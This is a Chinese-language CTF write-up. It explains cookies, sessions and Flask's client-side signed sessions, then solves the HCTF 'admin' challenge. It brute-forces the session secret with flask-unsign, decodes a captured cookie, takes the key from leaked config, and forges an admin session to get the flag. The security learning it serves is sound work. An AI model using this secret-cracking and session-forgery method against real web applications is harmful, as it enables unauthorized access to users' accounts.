这两天遇到一道挺有意思的题目，是通过伪造session来做的。

要知道什么是session，那么我们首先要知道cookie。

### cookie

http诞生之初只有GET请求，并没有cookie那些。后面随着购物那些网站的兴起，就需要有一个机制来记录用户购物车的信息。这样cookie就诞生了。

> Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行 Session 跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息 。

关于cookie的工作机制，我画了一张图来帮助理解。

![image-20210713165602869](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713165602869.png)

用户将cookie跟请求一起发送给服务器，服务器也会将响应跟cookie一起发给用户，数据少的时候还好。数据一多，cookie就会变得非常庞大，发送请求也会很吃力。况且数据其实在服务端已经有一份了，我们只需要进行认证就行了，这就出现了session。

### session

因为用户信息已经保存在了服务端了，所以我们只需要在cookie里面保存能够识别用户身份的信息就行了，只要知道是谁发起的请求就行了，而不用把所有的数据都存放在cookie当中。这样就大大减少了cookie的体积。这种可以识别请求是谁发送的机制称为session(会话机制)，生成的可以识别用户身份信息的称为sessionid。工作机制如下。

![image-20210713215031270](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713215031270.png)

用户在购物网站登录，服务器会生成一个唯一的sessionid绑定用户，然后再将sessionid传递回用户。用户对商品加入购物车的请求的cookie只需要有商品id和sessionid就可以了，服务端会自动进行识别是哪个用户，然后将商品加入用户的购物车。而不是跟之前那样会将购物车当中的所有商品id都存在cookie当中。



由此我们可以知道cookie是存在用户本地的，session是存在服务端的。sessionid需要借助cookie来传递。但是这种情况也有例外的。

### Flask

Flask是一个用python写的轻量级web框架，这个框架有个特点就是session不是存在服务端当中，而是存在客户端当中的。我们通过http的请求头就可以轻松获得session。

但是这也不是可以轻易拿来使用的。框架对session进行了base64编码以及进行了密钥签名。

格式为这个**base64后的源字符串 . 时间戳 . hmac签名信息**

例如

```
eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn4pw.6KQvoMiQZo1Ttjr4dFJ7e0AN45U
```

这个是由{"_permanent":true,"username":"st4ck"}，密钥为admin来生成的

也就是说我们需要有密钥才能够伪造session，只有用户信息的话也是不行的

这里有个对session进行编码和解码的工具

https://github.com/noraj/flask-session-cookie-manager

使用方法：

安装

```
pip3 install flask-unsign
```

爆破

```
flask-unsign --unsign --cookie  "eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn4pw.6KQvoMiQZo1Ttjr4dFJ7e0AN45U"
```

![image-20210713224214063](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713224214063.png)

可以看到成功把密钥爆破了出来

### Hctf-admin

随便注册一个账户登录发现有源码泄露

![image-20210713230309308](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713230309308.png)

发现这是一个flask的框架，session是存储在本地的。而且里面也提示说不是admin，那么登录admin应该就可以获取flag了。利用伪造session来登录，需要得到一个密钥才能够伪造

在http头处的cookie获得session

```
eJw9kEGLwjAUhP_K8s4eatqT4KFSWxReQiSaTS7Sdatpaiy0im3E_77RBa_z8WbezAP2x67qDcyu3a2awL7-hdkDvn5gBpRsB-p4jD43SPJGeRUruYq02zi06aiLoEtFlD3FLEsTJnKj_OJMBb9Tm1ss1IDFzlB7GFhmalpsE8x4pO2u0SL4yNWo_CtDjYrwSIl0pGQ1MGFqbReWiXSKBfda8IRmZ0PF2im3q4MWs3AbNIviEIcP5vCcwKHvjvtr21SXT4VXHJPolVx6-ooioY7EBAm_o2_umGnHsoVjchlRuQ61Akvnb7valafq41R-b2R1-ieX0gUAXdteYQK3vures8E0gucffIJsAw.YO2nMg._UhP0Bcon1YSGs89pfiqDANNs18
```

解码后

```
{"_fresh":true,"_id":{" b":"N2UxNmQ3MzFhM2FkYzY3YWI0ZmRmMjAyZGFhMWY2Yjg3ODA4OTFhYzBlNTQwNjFjMGYxMGVhNjcxODhiNGU4MDQ0ZjVkZTI0ZWIyYzUxNmYyY2Q0YTAyN2IxOThiZjBjOTA1MGQzZTQ4NDlhNTJmYmViMGQ3OWIyNDljMTc3Y2Y="},"csrf_token":{" b":"MDQ0OWMzYWEzNzUxN2Q3MWM4M2QwMzkwMDZmODBmOWE0NWJmMjM4MA=="},"image":{" b":"aXRWeg=="},"name":"root","user_id":"10"}
```

![image-20210713225506498](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713225506498.png)

利用工具爆破key，爆破不出来，那么key应该是给出的了

在app下的config.py处发现key为“ckj123”

![image-20210713231538690](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713231538690.png)

自己构造一个session

```
{'_fresh': True, '_id': b'7e16d731a3adc67ab4fdf202daa1f6b8780891ac0e54061c0f10ea67188b4e8044f5de24eb2c516f2cd4a027b198bf0c9050d3e4849a52fbeb0d79b249c177cf', 'csrf_token': b'0449c3aa37517d71c83d039006f80f9a45bf2380', 'image': b'MAuE', 'name': 'admin', 'user_id': '10'}
```

![image-20210713234643429](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713234643429.png)

![image-20210713234728359](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210713234728359.png)

成功登录获得flag

